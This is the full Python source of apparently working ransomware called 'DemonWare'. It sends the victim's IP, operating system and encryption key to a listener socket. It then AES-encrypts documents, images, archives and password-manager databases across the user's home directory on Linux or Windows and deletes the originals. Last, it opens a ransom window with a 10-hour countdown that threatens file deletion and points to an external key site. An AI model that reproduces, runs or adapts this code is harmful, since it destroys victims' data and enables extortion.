#/usr/bin/env python
import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time
from Tkinter import *
from ttk import *
from Crypto import Random
from Crypto.Cipher import AES

class mainwindow(Tk):
    def __init__(self):
        Tk.__init__(self)
        self.title(string = "Tango Down!") # Set window title
        self.resizable(0,0) # Do not allow to be resized
        self.configure(background='black')

        self.options = {
            'key' : StringVar()
        }

        #self.bind("<Escape>", self.exit) # Press ESC to quit app
        message = '''
Seems like you got hit by DemonWare ransomware!

Don't Panic, you get have your files back!

DemonWare uses a basic encryption script to lock your files.
This type of ransomware is known as CRYPTO.
You'll need a decryption key in order to unlock your files.

Your files will be deleted when the timer runs out, so you better hurry.
You have 10 hours to find your key

C'mon, be glad I don't ask for payment like other ransomware.

Please visit: https://keys.zeznzo.org and search for your IP/hostname to get your key.

Kind regards,

Zeznzo
        '''
        Label(self, text = message, font='Helvetica 16 bold', foreground = 'white', background = 'red').grid(row = 0, column = 0, columnspan = 4)

        Label(self, text = '', font='Helvetica 12 bold', foreground='red', background = 'black').grid(row = 4, column = 0)
        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 0, columnspan = 4)
        Label(self, text = '', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 0, columnspan = 4)


        def start_thread():
            # Start timer as thread
            thread = threading.Thread(target=start_timer)
            thread.daemon = True
            thread.start()

        def start_timer():
            Label(self, text = 'Enter Decryption Key:', font='Helvetica 12 bold', foreground='red', background = 'black').grid(row = 4, column = 0)
            Entry(self, textvariable = self.options['key'], width = 50).grid(row = 4, column = 1, columnspan = 3)

            Label(self, text = 'TIME LEFT:', font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 5, column = 0, columnspan = 4)
            try:
                s = 36000 # 10 hours
                while s:
                    #event = (datetime.datetime(day=11,month=6,year=2019, hour=18, minute=0)) - datetime.datetime.now()
                    min, sec = divmod(s, 60)
                    time_left = '{:02d}:{:02d}'.format(min, sec)

                    Label(self, text = time_left, font='Helvetica 18 bold', foreground='red', background = 'black').grid(row = 6, column = 0, columnspan = 4)
                    time.sleep(1)
                    s -= 1
            except KeyboardInterrupt:
                print('Closed...\n\n')

        start_thread()

def getlocalip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    return s.getsockname()[0]

def gen_string(size=64, chars=string.ascii_uppercase + string.digits):
      return ''.join(random.choice(chars) for _ in range(size))

# Encryption
def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encrypt(message, key, key_size=256):
    message = pad(message)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)

def encrypt_file(file_name, key):
    with open(file_name, 'rb') as fo:
        plaintext = fo.read()
    enc = encrypt(plaintext, key)
    with open(file_name + ".DEMON", 'wb') as fo:
        fo.write(enc)


host = '127.0.0.1'
port = 8989

#key = hashlib.sha1(gen_string().encode('utf-8')).hexdigest()
#print(len(key))
key = hashlib.md5(gen_string()).hexdigest()
platform = platform.system()

# Encrypt file that endswith
ext = ['.txt',
    '.ppt','.pptx','.doc','.docx','.gif','.jpg','.png', '.ico', '.mp3','.ogg',
    '.csv','.xls','.exe','.pdf', '.ods','.odt','.kdbx','.kdb','.mp4','.flv','.ini',
    '.iso','.zip','.tar','.tar.gz','.rar']

def get_target():
    # Encrypt on this location
    # Users home on Linux
    if platform == 'Linux':
        target = '/home/' + getpass.getuser() + '/'
        return target

    # Users home on Windows
    elif platform == 'Windows':
        target = 'C:\\Users\\' + getpass.getuser() + '\\'
        return target
    else:
        sys.exit(1) # Cannot find users home directory, skip MacOS.

def start_encrypt(target, key):
    try:
        for path, subdirs, files in os.walk(target):
            for name in files:
                for i in ext:
                    if name.endswith(i.lower()):
                        encrypt_file(os.path.join(path, name), key)
                        os.remove(os.path.join(path, name))

        #os.remove(sys.argv[0]) # destroy encrypter when finished
    except Exception as e:
        pass # continue if error

def connector():
    server = socket.socket(socket.AF_INET)
    server.settimeout(1)

    try:
        # Send Key
        server.connect((host, port))
        server.send('%s$%s$%s' % (getlocalip(), platform, key))

        start_encrypt(get_target(), key)

        main = mainwindow()
        main.mainloop()

    except Exception as e:
        # Do not send key, encrypt anyway.
        start_encrypt(get_target(), key)
        main = mainwindow()
        main.mainloop()

try:
    connector()
except KeyboardInterrupt:
    print("\033[1;91m[!]\033[0m Disconnected")
